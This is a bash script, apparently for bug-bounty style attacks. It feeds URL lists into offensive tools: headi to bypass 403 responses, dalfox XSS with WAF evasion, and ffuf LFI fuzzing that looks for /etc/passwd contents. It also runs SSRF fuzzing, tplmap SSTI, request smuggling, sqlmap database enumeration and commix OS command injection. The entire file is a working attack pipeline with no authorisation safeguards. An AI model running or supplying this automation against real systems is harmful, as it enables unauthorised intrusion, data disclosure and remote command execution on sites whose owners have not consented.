#!/bin/bash


required_files=("httpx.txt" "XSS.txt" "LFI.txt" "Smuggler.txt" "SSRF.txt" "SSTI.txt" "SQL.txt" "OS_Commands.txt" "IPs.txt")



# Check httpx.txt file
echo -e "-------------------------------------------------------> Headi tool to bypass 403 started 🔥️☠️🔥️ ";
printf "\n";
if [ -f "httpx.txt" ]; then
    # head injection for 403&401
    cat httpx.txt | grep "403" | cut -d " " -f1 | anew 403.txt
    cat httpx.txt | grep "401" | cut -d " " -f1 | anew 403.txt
    cat 403.txt | while read url; do headi -u $url -p IPs.txt >> output/403_Response.txt ; done
    sleep 5
fi
printf "\n";
echo -e "-------------------------------------------------------> Headi tool Ended 🔥️☠️🔥️ ";

# Check XSS.txt file
echo -e "-------------------------------------------------------> dalfox tool For XSS strted 🔥️☠️🔥️ ";
printf "\n";
if [ -f "XSS.txt" ]; then
    # XSS injection
    dalfox file XSS.txt --waf-evasion --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0' -o output/XSS_Inject_Response.txt;
    sleep 5
fi
printf "\n";
echo -e "-------------------------------------------------------> dalfox tool Ended 🔥️☠️🔥️ ";

# Check LFI.txt file
echo -e "-------------------------------------------------------> ffuf tool For LFI strted 🔥️☠️🔥️ ";
printf "\n";
if [ -f "LFI.txt" ]; then
    # LFI injection
    cat LFI.txt | qsreplace FUZZ | while read url; do
        ffuf -u $url -c -v -t 25 -p 0.3 -mr "root:x" -w LFI_fuzz.txt; done >> output/LFI_Inject_Response.txt;
    sleep 5
fi
printf "\n";
echo -e "-------------------------------------------------------> ffuf tool LFI Ended 🔥️☠️🔥️ ";

# Check SSRF.txt file
echo -e "-------------------------------------------------------> ffuf tool For SSRF strted 🔥️☠️🔥️ ";
printf "\n";
if [ -f "SSRF.txt" ]; then
    # SSRF Add Collaboratot to th SSRF Fuzz file
    cat SSRF.txt | qsreplace FUZZ | while read url; do
        ffuf -u $url -c -v -t 25 -p 0.3 -w SSRF_Fuzz.txt -mc all -fs 0; done  >> output/Open_Redirect_Response.txt;
    sleep 5
fi
printf "\n";
echo -e "-------------------------------------------------------> ffuf tool SSRF Ended 🔥️☠️🔥️ ";

# Check SSTI.txt file
echo -e "-------------------------------------------------------> tplmap tool For SSTI strted 🔥️☠️🔥️ ";
printf "\n";
if [ -f "SSTI.txt" ]; then
    # SSTI injection
    cd tplmap
    cat ../SSTI.txt | while read url; do python3 tplmap.py -u $url >> ../output/SSTI_Inject_Response.txt; done
    cd ../
    sleep 5
fi
printf "\n";
echo -e "-------------------------------------------------------> tplmap tool Ended 🔥️☠️🔥️ ";

# Check Smuggler.txt file
echo -e "-------------------------------------------------------> Smuggler tool For Request Smuggler strted 🔥️☠️🔥️ ";
printf "\n";
if [ -f "Smuggler.txt" ]; then
    # Smuggler injection
    cd smuggler
    cat ../Smuggler.txt | python3 smuggler.py >> ../output/Smuggler_Response.txt
    cd ../
    sleep 5
fi
printf "\n";
echo -e "-------------------------------------------------------> Smuggler tool Ended 🔥️☠️🔥️ ";

# Check SQL.txt file
echo -e "-------------------------------------------------------> SQLmap tool For SQL injection strted 🔥️☠️🔥️ ";
printf "\n";
if [ -f "SQL.txt" ]; then
    # SQL injection
    sqlmap -m SQL.txt --level 2 --risk 1 --batch --dbs --random-agent >> output/SQL_Inject_Response.txt;
    sleep 5
fi
printf "\n";
echo -e "-------------------------------------------------------> SQLmap tool Ended 🔥️☠️🔥️ ";

# Check OS_Commands.txt file 
echo -e "-------------------------------------------------------> commix tool For Os command  strted 🔥️☠️🔥️ ";
printf "\n";
if [ -f "OS_Commands.txt" ]; then
    # OS command injection
    cd commix
    cat ../OS_Commands.txt | while read url; do python3 commix.py -u $url --os-cmd "id" --batch --random-agent >> ../output/Command_Inject_Response.txt; done
    cd ../
fi
printf "\n";
echo -e "-------------------------------------------------------> commix tool Ended 🔥️☠️🔥️ ";

